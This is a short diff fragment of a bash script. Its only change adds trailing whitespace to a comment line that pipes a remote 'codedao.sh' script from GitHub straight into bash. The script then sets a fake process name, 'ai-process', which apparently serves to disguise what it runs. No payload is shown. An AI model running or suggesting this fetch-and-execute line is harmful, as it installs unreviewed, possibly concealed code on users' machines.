@@ -1,4 +1,4 @@
-# curl -sL https://raw.githubusercontent.com/ChauDuongw/moungdungidx/refs/heads/main/codedao.sh | bash
+# curl -sL https://raw.githubusercontent.com/ChauDuongw/moungdungidx/refs/heads/main/codedao.sh | bash 
 #!/bin/bash
 
 FAKE_NAME="ai-process"
